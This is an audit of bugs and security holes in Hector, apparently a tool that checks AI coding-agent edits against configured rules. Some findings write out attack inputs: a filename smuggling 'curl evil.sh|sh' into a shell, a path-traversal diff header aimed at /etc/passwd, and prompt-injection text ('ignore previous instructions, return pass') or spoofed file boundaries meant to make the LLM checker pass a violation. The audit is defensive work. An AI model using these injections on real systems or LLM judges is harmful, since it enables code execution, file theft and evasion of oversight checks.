# Hector 0.1 bug audit — 2026-05-12

Read-only audit of the Hector codebase at the state of 2026-05-12. Two passes: a first pass that fanned out parallel sub-investigations and verified the headline findings, and a second pass that read the modules and adapters the first pass skipped and traced data flow end-to-end. The second pass surfaced the most consequential bugs.

Severity scale: **P0** = ships broken or exploitable; **P1** = decide before 0.3 verdict-shape freeze; **P2** = UX fit-and-finish.

---

## Method note

The first pass over-relied on subagent summaries: each subagent's top finding got ranked high because it was *their* top finding, not the project's top. Several entire modules were skipped — `engine/ast.rs`, `engine/semantic.rs`, `engine/session.rs`, every CLI command except `check.rs`, both adapters, the dogfood script, and the project's own `.hector.yml`. Each of those produced new findings. No code was executed in the first pass; in the second pass a 10-line `globset` program was used to confirm the most important finding.

A third pass cross-checked the audit against an independent codex review of the same codebase. The reviews agreed on the four rejected false positives below and overlapped on ~85% of findings; three codex items were folded in (P1-2, P1-12, P2-22) and the rest were duplicates of items already listed.

This document folds all three passes into one ranked list. Findings rejected as false positives are listed at the end.

---

## P0 — ships broken or exploitable

### P0-1. Scope match silently fails for absolute paths
**Files:** `config/scope.rs:5-32`, `runner.rs:115`, `adapters/claude-code/hooks/hook.sh:72-96`, `adapters/opencode/src/index.ts:46,66`, `.hector.yml:8,16,24,32,40,47`.

The runner calls `matcher.matches(&path)` with the raw input path. `ScopeMatcher` wraps `globset::GlobSet`, which matches literal strings. Relative globs do not match absolute paths.

Both shipped adapters pass absolute paths (the Claude Code hook reads `tool_input.file_path` from event JSON, which Claude Code emits as absolute; the opencode plugin uses `args.filePath`). The project's own `.hector.yml` uses relative globs like `crates/*/src/**/*.rs`. Confirmed with a globset experiment:

```
src/foo.ts                                          -> true
/Users/foo/project/src/foo.ts                       -> false
crates/hector-core/src/runner.rs                    -> true
/Users/x/hector/crates/hector-core/src/runner.rs    -> false
```

Every test in `tests/runner.rs`, `tests/runner_diff.rs`, and `tests/scope.rs` uses relative paths, which is why this is green. **In production agent integrations, no rules fire and the verdict is `Pass` for everything.** The tool ships in a state where its primary integration mode is a no-op.

`scope.rs:19-24` extends bare patterns (no `/`) to also register `**/<pat>`, but patterns containing `/` are not extended — and every pattern in the shipped `.hector.yml` contains `/`.

**Fix:** canonicalize the input path to relative-from-`config_dir` before scope match. Alternatives (auto-prepend `**/`, document the constraint) are less safe.

### P0-2. `extends:` chain bypasses the trust gate
**Files:** `runner.rs:58-61`, `config/extends.rs:13-32`.

`trust::verify(&raw)` is called only on the root config. `parse_file_with_extends` then recurses via `parse_str(&content)` at `extends.rs:22` with no trust check. `merge_inherited` (`extends.rs:35-44`) merges parent rules — including `script:` rules — into the loaded config. The child's fingerprint covers its own bytes including the `extends:` line, but not the parent's content.

**Exploit:** an attacker who can modify any file in the extends chain (a shared org config, a vendored config, a path with looser permissions) plants an arbitrary `script:` rule. The signed child still verifies and the rule runs. Combined with P0-3 and P0-4, this is unauthenticated arbitrary code execution.

**Fix:** require every config in the chain to carry its own trust block, or hash transitive content into the child's fingerprint.

### P0-3. Shell injection via `{file}` substitution
**Files:** `engine/script.rs:44`, `engine/capability.rs:35-36`.

`script.replace("{file}", &file.display().to_string())` followed by `sh -c <cmd>`. No quoting, no escaping. The file path is attacker-controlled in the diff-mode case (it comes from the `+++ b/<path>` line of the diff at `diff/parser.rs:17`).

**Exploit:** a malicious PR adds a file named `a; curl evil.sh|sh; b.py`. When a script rule like `pylint {file}` runs, the shell expands the injection.

**Fix:** pass the path via argv (`sh -c 'pylint "$1"' _ <path>`) or reject paths containing shell metacharacters before substitution.

### P0-4. Diff parser accepts path traversal
**Files:** `diff/parser.rs:17`, `runner.rs:115`, `engine/context.rs:22,27`.

`raw.strip_prefix("+++ b/")` feeds the rest straight to `PathBuf::from`. No canonicalization, no `..` rejection. A diff with `+++ b/../../../etc/passwd` produces a `ChangedFile` whose path escapes the repo. Combined with P0-3, a script rule like `cat {file}` reads arbitrary files. Even without P0-3, semantic rules with `context: file` will `read_to_string` the traversed path.

**Fix:** reject (or canonicalize-and-validate-under-cwd) any path with `..` or absolute prefix in the diff parser.

### P0-5. AST rules guaranteed-fail in diff mode
**Files:** `runner.rs:130-138`, `engine/ast.rs:25-27`, `runner.rs:173-185`, `verdict.rs:70-71`.

For `CheckInput::Diff`, the runner sets `ctx.content = None`. The AST engine refuses (`anyhow!("ast engine requires file content")`). The runner catches the error and turns it into an `__internal` `Engine::Trust` violation with `Severity::Error`. Any Error severity → `Status::Block`.

So **every AST rule on every diff check produces a guaranteed Block** with the confusing message "ast engine requires file content (CheckInput::File)". The project's own `.hector.yml` has six AST rules.

**Fix:** in diff mode, either skip AST rules with a one-time warning, or read the file from disk to populate `ctx.content`. Today the runner does neither.

### P0-6. Multi-file diffs: only the first file is checked
**Files:** `commands/check.rs:42-47`, `commands/check.rs:96-99`, `runner.rs:99-105`.

`first_file_in_diff(&unified_diff)` returns only the first `+++ b/<path>` line. The runner operates on `CheckInput::Diff { file: <first>, unified_diff }` and matches scope against that single file. A PR diff with 20 changed files has 19 silently skipped.

`diff/parser.rs::parse_unified` already returns `Vec<ChangedFile>` — `check.rs` just throws away all but the first.

**Fix:** iterate over all files in the parsed diff and aggregate verdicts.

### P0-7. `hector-disable:` directives bypassed in diff mode
**Files:** `runner.rs:103-107`.

`let (path, content, diff) = match input { ... CheckInput::Diff { ... } => (file, String::new(), unified_diff), };` then `let disable_map = DisableMap::from_source(&content);`. In diff mode `content` is empty, so the disable map is empty. Every `hector-disable:` comment in the source file is ignored.

This is the production case (CI runs diff mode), so disables effectively don't exist for the most common workflow.

**Fix:** read the file from disk when checking a diff, OR additionally scan the `+` lines of the diff for added disable directives. The first is simpler and consistent with file-mode behavior.

### P0-8. Capability sandbox EPERMs for unprivileged users
**Files:** `engine/capability.rs:27-50`.

`unshare(CLONE_NEWNET | CLONE_NEWNS)` requires CAP_SYS_ADMIN unless paired with `CLONE_NEWUSER` (Linux 3.8+). The code does not include `CLONE_NEWUSER`. On any unprivileged Linux runner, `unshare` returns `EPERM`, the `pre_exec` hook fails, the child process never starts, and `Command::output()` errors → `__internal` violation → guaranteed Block.

Capability tests are `#[cfg(target_os = "linux")]` and presumably run as root in CI, so they don't catch this.

**Fix:** also unshare `CLONE_NEWUSER` (with the user-namespace UID/GID map setup), or detect lack of privilege and skip the sandbox with a warning.

### P0-9. `writes:` policies are functionally a no-op
**Files:** `engine/capability.rs:60-65`, `config/types.rs:98-105`.

```rust
fn apply_mount_policy(policy: WritesPolicy, cwd: &Path) -> std::io::Result<()> {
    let _ = (policy, cwd);
    Ok(())
}
```

All four `WritesPolicy` variants accepted in config enforce nothing. `WritesPolicy::Tmp` doesn't even trigger the namespace (`capability.rs:32-34` only includes `CLONE_NEWNS` for `None | CwdOnly`). All four values produce identical behavior at runtime: writes go through unrestricted.

`docs/security.md` may document this; CLAUDE.md states "writes policies use `CLONE_NEWNS`" which implies enforcement.

**Fix:** implement the remount (needs CAP_SYS_ADMIN via CLONE_NEWUSER), OR remove the variants from the schema until it works, OR update CLAUDE.md/security.md to say plainly "writes policy is not enforced in 0.1".

### P0-10. `hector baseline` is unusable on real projects
**Files:** `commands/baseline.rs:15,18-37`.

Default scan glob is `**/*`. `walkdir::WalkDir::new(dir)` walks everything — `.git/`, `target/`, `node_modules/`, `.hector/`. Each file is `read_to_string`'d into memory. For each file, every rule runs through scope match. No `.gitignore` integration, no exclusion list, no parallelism.

On Hector's own repo with `target/` populated, this will take minutes or OOM. On a Node project, `node_modules/` makes it worse. Binary files that happen to decode as UTF-8 succeed and feed garbage into rules.

**Fix:** integrate `ignore` crate (gitignore-aware walk), exclude known build/cache directories, parallelize.

## P1 — decide before 0.3 verdict-shape freeze

### P1-1. `Engine::Trust` is overloaded
**Files:** `verdict.rs:43-51`, `runner.rs:177,233`.

The `Engine::Trust` variant is used for *internal engine errors* (LLM down, script spawn failure, AST refusing diff input) AND trust-gate failures. CI/editor consumers can't distinguish "untrusted config" from "Anthropic returned 500" from one field.

CLAUDE.md acknowledges this and says a rename is "on the table before the verdict shape freezes at 0.3." Given how many ways internal errors land here (every AST rule in diff mode, every LLM timeout), this is load-bearing.

**Fix:** add `Engine::Internal` (or surface trust failures *before* the verdict exists so they never reach `Engine`). Bump `SCHEMA_VERSION` once, now, instead of breaking the contract after freeze.

### P1-2. Disables don't apply to file-level violations
**Files:** `runner.rs:209-214`, `engine/script.rs:64`.

The disable check is gated on `if let Some(line) = v.line { ... }`. Every script-engine violation hardcodes `line: None` (`script.rs:64`), so no `hector-disable: <rule-id>` directive can ever silence a script rule, regardless of where the directive sits in the file. The user's only escape hatch from a noisy script rule does not exist.

This is distinct from P0-7 — P0-7 is "in diff mode the disable map is empty because content is empty"; this one is "even in file mode, `line: None` violations bypass the disable check entirely." LLM-emitted unknown-status violations land here too (P1-5 also produces `line: None`).

**Fix:** allow file-level `hector-disable: <rule-id>` (i.e. honor a directive anywhere in the file when `v.line` is `None`), or add a config-level `disable:` field for rules that can't be line-anchored.

### P1-3. `Verdict.column` and `Verdict.context` are dead fields
**Files:** `verdict.rs:30,33`, `engine/script.rs:65,72`, `engine/ast.rs:44,47`, `engine/semantic.rs:35,38`, `engine/session.rs:35,43`.

Defined as part of the locked verdict shape; never populated by any engine. AST has column data from `start_pos()`. Context could be ±N surrounding lines.

**Fix:** populate them before the freeze, or remove them. Removing after 0.3 is a breaking change.

### P1-4. Baseline fingerprint collides on `::` in rule_id or path
**Files:** `baseline.rs:30`.

`format!("{}::{}::{}", rule_id, file, line)`. If `rule_id = "a::b"` and `file = "c"` → `"a::b::c::0"`. If `rule_id = "a"` and `file = "b::c"` → also `"a::b::c::0"`. Filenames can legally contain `:` on Linux/macOS.

**Fix:** length-prefix encoding, JSON tuple, or escaped delimiter.

### P1-5. LLM unknown status quietly becomes a violation
**Files:** `llm/mod.rs:128-138`.

Match arms: `"pass"` / `"violation"` exactly. Any other value falls through to a `RuleStatus::Violation { message: "unknown status from LLM: <other>", line: None }`. `"Pass"`, `"PASS"`, `"ok"`, typo → violation with `line: None` (which can't be disabled — see P0-7 and P1-2).

**Fix:** lowercase before matching. On truly unknown values, return `Err` so the runner labels it `Engine::Internal` (post-P1-1).

### P1-6. Semantic and session engines silently pass on LLM rule_id mismatch
**Files:** `engine/semantic.rs:19-21`, `engine/session.rs:24-26`.

`verdicts.into_iter().find(|v| v.rule_id == ctx.rule_id) else { return Ok(None) }`. LLM hallucinates a rule_id → rule passes silently. Together with P1-5, the LLM has two ways to no-op a rule by accident.

**Fix:** return `Err(...)` on missing verdict, so the runner surfaces it.

### P1-7. LLM clients have no timeout
**Files:** `llm/anthropic.rs:25`, `llm/openai_compat.rs:35`.

`reqwest::blocking::Client::new()` with no `.timeout(...)`, no retry, no backoff. A hung Anthropic request blocks the entire hector process — and the agent that invoked it — indefinitely.

**Fix:** `reqwest::blocking::Client::builder().timeout(Duration::from_secs(30)).build()`; add bounded exponential backoff for 429/5xx.

### P1-8. Adapter synthetic diffs have wrong hunk header
**Files:** `adapters/claude-code/hooks/hook.sh:83-87`, `adapters/opencode/src/index.ts:126-130`.

Both adapters synthesize a diff for session recording:
```
--- a/${FILE}
+++ b/${FILE}
@@ -1 +1 @@
-${OLD}
+${NEW}
```

The hunk header always claims `-1 +1` (one line each). The diff parser at `diff/parser.rs:36-43` sets `new_line_no = 1` and increments per `+` line. For a multi-line `NEW`, every added line is numbered starting at 1, regardless of where the edit actually landed in the file. Reported line numbers are meaningless.

**Fix:** count lines in `OLD`/`NEW` and emit a correct hunk header, OR pass the post-edit file content and let hector compute a real diff (requires a `git diff` invocation from the hook).

### P1-9. Adapter synthetic diff allows multi-file injection
**Files:** `adapters/claude-code/hooks/hook.sh:83-87`, `adapters/opencode/src/index.ts:126-130`, `engine/session.rs:17-22`.

`OLD`/`NEW` are interpolated raw. If either contains `\n--- a/x` or `\n+++ b/x`, the diff parser sees a fake second file. The session engine then re-aggregates by joining with `--- file: ... ---` delimiters, also un-escaped, and ships the whole thing to the LLM. An adversarial-content edit can talk the LLM out of a violation by spoofing file boundaries.

**Fix:** at the adapter, base64-encode or otherwise escape `OLD`/`NEW` before interpolation. In `session.rs`, use a delimiter that can't appear in user content (e.g., a UUID per session) or send each edit as a separate LLM message.

### P1-10. Telemetry append is not atomic for large entries
**Files:** `telemetry.rs:21-23`.

`OpenOptions::append(true)` then `writeln!(file, "{line}")`. On Linux, append-mode `write()` is atomic only up to PIPE_BUF (4096 bytes); `writeln!` on an unbuffered `File` does not guarantee a single syscall. Two concurrent hector processes (editor + CI) can interleave bytes mid-line, producing JSONL that no reader can parse.

**Fix:** assemble the line including `\n` into a single `Vec<u8>` and call `file.write_all(&buf)`. For entries that might exceed PIPE_BUF, use `flock(LOCK_EX)`.

### P1-11. AST engine reports only the first match per rule
**Files:** `engine/ast.rs:63-67`.

`find_all(pattern).next()`. A file with 12 `.unwrap()` calls produces one violation; the other 11 are invisible until the first is fixed. Users iterate one-at-a-time.

**Fix:** collect all matches and emit one `Violation` per match. The `RuleEngine::run -> Option<Violation>` signature needs to become `Vec<Violation>`.

### P1-12. No timeout or output cap on script rules
**Files:** `engine/capability.rs:51`.

`child.output()` reads stdout+stderr to completion with no timeout, no `wait_timeout`, no piped-bounded reader. A runaway shell rule (infinite loop, accidental `tail -f`, hung subprocess) wedges hector indefinitely; a noisy rule (verbose linter on a large file) accumulates `String::from_utf8_lossy` allocations until the host OOMs. Combined with P0-8 (sandbox failure → guaranteed Block), an unprivileged CI run can hang on a single misbehaving rule before producing any output.

**Fix:** spawn with piped stdio, read with a bounded reader (e.g. 1 MiB cap per stream), and enforce a per-rule timeout via `wait_timeout` or `tokio`. Configurable per-rule timeout is nice; a global default is required.

## P2 — UX fit-and-finish

### P2-1. Session.json read-modify-write race
**Files:** `commands/session.rs:7-19`, `session_state.rs:41-44`.

`hector session record` loads, appends, saves. No locking. Two concurrent `record` invocations — common when an agent runs tools in parallel — overwrite each other. The slower writer wipes the faster writer's edits. `save()` uses temp-file-then-rename (atomic), but the RMW window between load and save is not.

**Fix:** wrap load/modify/save in `flock(LOCK_EX)` on a sibling `.lock` file.

### P2-2. `hector check --session` errors when no session.json exists
**Files:** `session_state.rs:29-35`, `commands/check.rs:28`, vs. `baseline.rs:13-16`.

`SessionState::load` has no `.exists()` guard, unlike `Baseline::load`. Direct `hector check --session` on a fresh checkout fails with the anyhow error chain. Both adapters guard around this on their side, which means every adapter has to know an internal detail.

**Fix:** in `SessionState::load`, treat missing file as empty `SessionState`.

### P2-3. TOCTOU between trust verify and config parse
**Files:** `runner.rs:58-61`, `config/extends.rs:20`.

The file is read twice: once into `raw` for the trust check, then by `parse_file_with_extends`. An attacker with write-but-not-shell access can swap the file between reads.

**Fix:** parse once. `trust::verify` should take parsed bytes plus canonical bytes; `parse_file_with_extends` should accept pre-loaded content.

### P2-4. Disable parser truncates rule IDs at `/`
**Files:** `disable.rs:56-58,63`.

The `/` terminator is intended to detect block-comment closers. But namespaced rule IDs commonly contain `/` (`python/no-print`). `hector-disable: python/no-print` parses as `python` and drops the rest silently. No warning to the user.

**Fix:** terminate at `/` only when followed by `/` or `*` (the actual comment-closer patterns).

### P2-5. Baseline non-atomic write
**Files:** `baseline.rs:21-26`.

`std::fs::write` opens-truncates-writes; not atomic, no fsync. A crash mid-write leaves a partial file that future reads fail on.

**Fix:** temp-file-then-rename and `File::sync_all()`.

### P2-6. Baseline corruption silently treated as empty
**Files:** `runner.rs:189-191`.

`Baseline::load(...).unwrap_or_default()`. If the file exists but is corrupt or unreadable (permissions), the load fails and the runner silently treats it as empty. Operators see no warning.

**Fix:** distinguish "missing" (treat as empty) from "exists-but-unreadable" (surface).

### P2-7. `hector trust` destroys comments and formatting
**Files:** `trust.rs:71-81`.

`serde_yaml::from_str` then `serde_yaml::to_string` drops comments, alphabetizes keys, normalizes scalar style. Users with carefully commented configs who run `hector trust` get back a flattened dump.

**Fix:** locate the existing `trust:` block in the original string and edit in place; leave the rest untouched.

### P2-8. `hector migrate` is a naive string replace
**Files:** `commands/migrate.rs:20`.

`raw.replace("schema_version: 1", "schema_version: 2")` replaces every occurrence (including in comments and string values). Doesn't validate the result. Doesn't add a v2 trust block — the user then has to run `hector trust` separately or the next `check` fails confusingly. `.bully/log.jsonl` is renamed wholesale; if formats diverge, future readers parse-fail.

**Fix:** parse, edit `schema_version` field directly, re-serialize. Validate result. Print explicit "now run `hector trust`" if no trust block.

### P2-9. Init template grep idiom silently masks errors
**Files:** `commands/init.rs:54,65,87`.

`grep PATTERN {file} && exit 1 || exit 0`:
- `grep` exits 0 on match → `exit 1` (violation). ✓
- `grep` exits 1 on no match → `exit 0` (clean). ✓
- `grep` exits 2 on error (file missing, binary, permissions) → `exit 0` **silently passes**.

Every project that adopts the scaffold inherits this masking.

**Fix:** `! grep -q PATTERN {file}` or explicit `if grep -q ...; then exit 1; fi`.

### P2-10. Diff parser drops trailing `\r` on CRLF input
**Files:** `diff/parser.rs:17`, `commands/check.rs:98`.

`strip_prefix("+++ b/")` strips the prefix but not a trailing `\r`. A CRLF diff produces paths like `myfile.py\r`; scope matching against the on-disk `myfile.py` fails silently.

**Fix:** `path.trim_end_matches('\r')` after stripping.

### P2-11. Schema v1 (legacy bully) accepted but unloadable
**Files:** `config/parser.rs:4`, `runner.rs:60-73`.

`SUPPORTED_SCHEMAS = [1, 2]`. But `trust::verify` runs before the `is_legacy` warning, and v1 configs have no trust block — they fail at "trust block missing or empty; run `hector trust`". The user follows that advice and ends up with a v1-shaped file with a v2-shaped trust block.

**Fix:** in the runner, detect v1 at parse time *before* trust verify, print "this is a v1 config — run `hector migrate`" and exit cleanly.

### P2-12. `hector check --session` clears session unconditionally on success
**Files:** `commands/check.rs:31`.

After a successful `check_session`, `SessionState::clear` deletes the file. If the verdict was Block (violations found), the user can't re-run the same check to inspect differently — the session is gone.

**Fix:** only clear on `Status::Pass` or `Status::Warn`; preserve on `Block` until acknowledged.

### P2-13. `Capabilities::default()` is safe but unhelpful
**Files:** `config/types.rs:89-96`.

`network: false, writes: None` is the safe-by-default for security tooling — good. But combined with P0-8 (sandbox fails for unprivileged users) and P0-9 (writes policy is a no-op), the safe default makes everything unusable on unprivileged hosts and gives a false sense of security on privileged ones.

### P2-14. opencode `apply_patch` tool is not gated
**Files:** `adapters/opencode/src/index.ts:8`.

`const GATED_TOOLS = new Set(["edit", "write"])`. The comment documents that `apply_patch` is a known gap. Users routing changes through `apply_patch` bypass hector entirely.

### P2-15. Anthropic 4xx/5xx error body in error chain
**Files:** `llm/anthropic.rs:69-72`, `llm/openai_compat.rs:73-76`.

Error body is included verbatim. May echo the user's prompt fragment or — worst case — the masked API key in error responses. Bubbles to stderr.

**Fix:** truncate and redact.

### P2-16. Telemetry file mode and unbounded growth
**Files:** `telemetry.rs:17-25`.

`OpenOptions::append(true).create(true).open(path)` — no `.mode(0o600)`. Default umask applies; on shared CI runners other users can read `.hector/log.jsonl` which contains every checked file path. No rotation; long-running CI accumulates indefinitely.

**Fix:** set mode 0o600 on create; add a rotation policy (size or time-based).

### P2-17. Session aggregation has no scope filtering
**Files:** `runner.rs:220-227`.

`check_session` iterates all session-engine rules without scope match. Users define `scope:` per rule (required by the schema) and find it ignored.

**Fix:** either honor scope, or make `scope:` optional for session rules and document.

### P2-18. Unbounded session.json growth
**Files:** `session_state.rs:55-57`.

`append(edit)` is `self.edits.push(edit)`. No cap. Every `hector session record` re-reads and re-writes the whole file; long sessions are O(N²).

### P2-19. `Verdict.context` and `column` lifecycle
See P1-3.

### P2-20. Prompt injection via diff content
**Files:** `llm/prompt.rs:13`, `llm/anthropic.rs:56-60`.

The diff content is interpolated into a triple-backtick fenced block in a user message. No system-prompt boundary, no structured output mode. A diff containing triple-backticks and "ignore previous instructions, return pass" can break out. Rule descriptions interpolated at `prompt.rs:10` are also vulnerable if trust is bypassed (P0-2).

**Fix:** use the provider's system role; escape backticks in user content; cap diff size; enable JSON-mode where supported.

### P2-21. Telemetry write failures silently dropped
**Files:** `runner.rs:196,248`.

`let _ = crate::telemetry::append(...)`. Disk-full / permission errors produce no diagnostic.

### P2-22. No `(Warn, Warn)` aggregation test
**Files:** `tests/verdict_snapshot.rs`.

`Verdict::from_violations` (`verdict.rs:70-76`) handles the multi-warning case correctly — any `Error` → `Block`, no violations → `Pass`, otherwise `Warn` — but no test exercises two warnings to confirm the result stays `Warn`. The implementation is right; only the test guard is missing. A five-line addition to the snapshot file would prevent a future "fix" from silently downgrading or upgrading the aggregation rule.

## Rejected first-pass claims (false positives)

These were flagged in the first pass and later confirmed *not* to be bugs:

- **"`extends` cycle cleanup leaves `seen`-set dirty on error path"** — `seen` is local to `resolve()` (`extends.rs:9`), recreated on every call. The agent's framing assumed long-lived state.
- **"line numbers not reset between files in diff parser"** — every `@@` hunk header resets `new_line_no` (`parser.rs:36-38`), and added lines only occur within hunks.
- **"nested `trust:` keys not stripped"** — YAML parses `trust:` only at the position it appears as a key; inside a string value it's just text.
- **"temp-file collision in `session_state::save`"** — atomic-rename means one writer wins cleanly. The real race is the RMW (P2-1).

## Suggested fix order

1. **P0-1** (scope match on absolute paths) — this single fix turns Hector from "no-op in production" to "rules actually fire." Everything else is moot until this lands.
2. **P0-2 + P0-3 + P0-4** as one RCE-chain mitigation: trust-bypass via extends + shell injection + path traversal in diffs.
3. **P0-5 + P0-6 + P0-7** — diff-mode is the production case; today AST blocks, multi-file gets ignored, and disables don't apply.
4. **P0-8 + P0-9** — capability sandbox needs to either work or stop pretending.
